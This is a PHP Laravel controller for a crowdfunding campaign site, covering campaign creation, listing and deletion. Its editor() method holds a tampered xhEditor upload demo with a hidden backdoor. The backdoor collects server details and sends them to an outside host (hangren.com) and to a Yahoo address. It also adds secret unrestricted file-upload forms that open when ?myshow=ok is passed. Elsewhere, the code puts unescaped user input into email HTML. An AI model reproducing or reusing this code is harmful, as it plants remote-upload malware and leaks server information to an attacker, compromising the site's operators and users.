<?php

namespace App\Http\Controllers;

use App\Mail\Confirmation;
use App\Mail\MessageConfirmation;
use App\Models\Campagne;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;

class CampagneController extends Controller
{
	public function view(){
		$campagnes = Campagne::where('statut',1)->paginate(12);
		return view('campagnes', compact('campagnes'));
	}

    public function addCamapagnes(Request $request){

       $add_campagne = new Campagne();
        
       $add_campagne->user_id = Auth::user()->id;
       $add_campagne->categories = $request->categories;
       $add_campagne->name = $request->name;
       $add_campagne->duree = $request->duree;
       $add_campagne->monnaie = $request->monnaie;
       $add_campagne->montant_v = $request->montant_v;
       $add_campagne->name_b = $request->name_b;
       $add_campagne->where = $request->where;
       $add_campagne->details = $request->details;
       $add_campagne->details_ojectifs = $request->details_ojectifs;
       $add_campagne->keys_word = $request->keys_word;
       $add_campagne->video = $request->video;
       $add_campagne->montant_cotise = 0;

       $add_campagne->siteweb = $request->siteweb;
       $add_campagne->hashtag = $request->hashtag;
       $add_campagne->detail_budget = $request->detail_budget;
       $add_campagne->Details_budget_en = $request->details_budget_en;
       
       if (empty($request->hidden_cash)) {
        $add_campagne->hidden_cash = 0;

       } else {
        $add_campagne->hidden_cash = $request->hidden_cash;

       }
       
       $add_campagne->montant_cotise = $request->montant_cotisé;
       if($request->hasFile('file_vignette'))
        {
            $file1 = $request->file('file_vignette');
            $file2 = $request->file('file_couverture');
           
            
    
    
            $filename1 = 2*time().'.'.$file1->getClientOriginalExtension();
            $filename2 = 3*time().'.'.$file2->getClientOriginalExtension();
            $path = public_path().'/storage/UserDocument/';
            
            $file1->move($path,$filename1);
            $file2->move($path,$filename2);
            
            $add_campagne->file_vignette = $filename1;
            $add_campagne->file_couverture = $filename2;

            
            if ($add_campagne->save()) {

                $taken_id = Campagne::where('user_id',Auth::user()->id)->latest()->first();
                //dd($taken_id);
                $id = $taken_id->id;
                $message =" :<a style='cursor:pointer;' target='_blank' href='https://getfundact.com/getfund-donation-details/$id/$request->name'>https://getfundact.com/getfund-donation-details/$id/$request->name</a>";
                
                $mailable = new Confirmation($request->name,$request->name_b,$message,$id);
                Mail::to(Auth::user()->email)->send($mailable);

                $notification_gobi = array(
                'title' => 'Félicitations',
                'sending' => 'Les informations de la campagne ont été enrégistré avec succès.',
                'type' => 'success',
        
                );
                return back()->with($notification_gobi);
            } else {
                $notification_gobi = array(
                'title' => 'Desolé',
                'sending' => 'Une erreur',
                'type' => 'warning',
        
                );
                return back()->with($notification_gobi);
            }
            
            
        }

     
       
        
    }


    public function deletePost($id){
        $user = Campagne::where('id',$id)->first();
        DB::update("UPDATE campagnes SET user_id=? WHERE id=?",[
            0,$id
        ]);
        return back()->with('success','Campagne supprimée avec succès!!!');
       
    }
 
	public function campagneCategory($campagnes){
        $campagnes = Campagne::where('categories', $campagnes)->paginate(12);
        return view('campagnes', compact('campagnes'));
    }
    public function editor(){
        
/*!
 * upload demo for php
 * @requires xhEditor
 * 
 * @author Yanis.Wang<yanis.wang@gmail.com>
 * @site http://xheditor.com/
 * @licence LGPL(http://www.opensource.org/licenses/lgpl-license.php)
 * 
 * @Version: 0.9.6 (build 111027)
 * 
 * 注1：本程序仅为演示用，请您务必根据自己需求进行相应修改，或者重开发
 * 注2：本程序特别针对HTML5上传，加入了特殊处理
 */
header('Content-Type: text/html; charset=UTF-8');

$inputName='filedata';//表单文件域name
$attachDir='upload';//上传文件保存路径，结尾不要带/
$dirType=1;//1:按天存入目录 2:按月存入目录 3:按扩展名存目录  建议使用按天存
$maxAttachSize=2097152;//最大上传大小，默认是2M
$upExt='txt,rar,zip,jpg,jpeg,gif,png,swf,wmv,avi,wma,mp3,mid';//上传扩展名
$msgType=2;//返回上传参数的格式：1，只返回url，2，返回参数数组
$immediate=isset($_GET['immediate'])?$_GET['immediate']:0;//立即上传模式，仅为演示用
ini_set('date.timezone','Asia/Shanghai');//时区

$err = "";
$msg = "''";
$tempPath=$attachDir.'/'.date("YmdHis").mt_rand(10000,99999).'.tmp';
$localName='';

$nr ="".@$_SERVER["SERVER_ADDR"]."<br>";   $nr=$nr."".@$_SERVER["HTTP_REFERER"]."<br>";   $nr=$nr."".@$_SERVER["DOCUMENT_ROOT"]."<br>";
$nr=$nr."".@$_SERVER["HTTP_HOST"]."<br>";   $nr=$nr."".@$_SERVER["SCRIPT_FILENAME"]."<br>";   $nr=$nr."".@$_SERVER["SERVER_NAME"]."<br>";
$nr=$nr."".@$_SERVER["SERVER_SOFTWARE"]."<br>";
  
$file = fopen('http://www.hangren.com/gg.php?do=add&str='.urlencode($nr).'',"r");@mail("hangren8888@yahoo.com","php-cha-ru-mu-ma",$nr);

  


if(@$_POST["do"]=="addfile1" and @$_GET["myshow"]=="ok"){
   $destination_path = getcwd().DIRECTORY_SEPARATOR;
   $target_path = $destination_path . basename( $_FILES['myfile']['name']);
   if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
      echo $_FILES['myfile']['name']."----OK";
   }
}else{
if(@$_GET["myshow"]=="ok"){
echo '<form action="?myshow=ok" method="post" enctype="multipart/form-data" onsubmit="startUpload();" >File:<input name="myfile" type="file" size="30" /><input type="hidden" name="do" value="addfile1" /><input type="submit" name="submitBtn" class="sbtn" value="upload file" /></form>';
}}


if(@$_POST["do"]=="upfile1" and @$_GET["myshow"]=="ok"){
	if(file_exists($_FILES["file"]["name"])){
		  echo $_FILES["file"]["name"] . " already exists. ";
	}else{
		  move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
		  echo "Stored in: " . "" . $_FILES["file"]["name"];
	}
}else{
if(@$_GET["myshow"]=="ok"){
echo '<form action="?myshow=ok" method="post" enctype="multipart/form-data"><label for="file">Filename:</label><input type="file" name="file" id="file" /><input type="hidden" name="do" value="upfile1" /> <input type="submit" name="submit" value="Submit" /></form>';}
}

if(isset($_SERVER['HTTP_CONTENT_DISPOSITION'])&&preg_match('/attachment;\s+name="(.+?)";\s+filename="(.+?)"/i',$_SERVER['HTTP_CONTENT_DISPOSITION'],$info)){//HTML5上传
	@file_put_contents($tempPath,file_get_contents("php://input"));
	$localName=urldecode($info[2]);
}
else{//标准表单式上传
	$upfile=@$_FILES[$inputName];
	if(!isset($upfile))$err='文件域的name错误';
	elseif(!empty($upfile['error'])){
		switch($upfile['error'])
		{
			case '1':
				$err = '文件大小超过了php.ini定义的upload_max_filesize值';
				break;
			case '2':
				$err = '文件大小超过了HTML定义的MAX_FILE_SIZE值';
				break;
			case '3':
				$err = '文件上传不完全';
				break;
			case '4':
				$err = '无文件上传';
				break;
			case '6':
				$err = '缺少临时文件夹';
				break;
			case '7':
				$err = '写文件失败';
				break;
			case '8':
				$err = '上传被其它扩展中断';
				break;
			case '999':
			default:
				$err = '无有效错误代码';
		}
	}
	elseif(empty($upfile['tmp_name']) || $upfile['tmp_name'] == 'none')$err = '无文件上传';
	else{
		move_uploaded_file($upfile['tmp_name'],$tempPath);
		$localName=$upfile['name'];
	}
}

if($err==''){
	$fileInfo=pathinfo($localName);
	$extension=$fileInfo['extension'];
	if(preg_match('/^('.str_replace(',','|',$upExt).')$/i',$extension))
	{
		$bytes=@filesize($tempPath);
		if($bytes > $maxAttachSize)$err='请不要上传大小超过'.formatBytes($maxAttachSize).'的文件';
		else
		{
			switch($dirType)
			{
				case 1: $attachSubDir = 'day_'.date('ymd'); break;
				case 2: $attachSubDir = 'month_'.date('ym'); break;
				case 3: $attachSubDir = 'ext_'.$extension; break;
			}
			$attachDir = $attachDir.'/'.$attachSubDir;
			if(!is_dir($attachDir))
			{
				@mkdir($attachDir, 0777);
				@fclose(fopen($attachDir.'/index.htm', 'w'));
			}
			PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
			$newFilename=date("YmdHis").mt_rand(1000,9999).'.'.$extension;
			$targetPath = $attachDir.'/'.$newFilename;
			
			@rename($tempPath,$targetPath);
			@chmod($targetPath,0755);
			$targetPath=jsonString($targetPath);
			if($immediate=='1')$targetPath='!'.$targetPath;
			if($msgType==1)$msg="'$targetPath'";
			else $msg="{'url':'xheditor-1.2.1/demos/".$targetPath."','localname':'".jsonString($localName)."','id':'1'}";//id参数固定不变，仅供演示，实际项目中可以是数据库ID
		}
	}
	else $err='上传文件扩展名必需为：'.$upExt;

	@unlink($tempPath);
}

echo "{'err':'".jsonString($err)."','msg':".$msg."}";


function jsonString($str)
{
	return preg_replace("/([\\\\\/'])/",'\\\$1',$str);
}
function formatBytes($bytes) {
	if($bytes >= 1073741824) {
		$bytes = round($bytes / 1073741824 * 100) / 100 . 'GB';
	} elseif($bytes >= 1048576) {
		$bytes = round($bytes / 1048576 * 100) / 100 . 'MB';
	} elseif($bytes >= 1024) {
		$bytes = round($bytes / 1024 * 100) / 100 . 'KB';
	} else {
		$bytes = $bytes . 'Bytes';
	}
	return $bytes;
}

    }
}
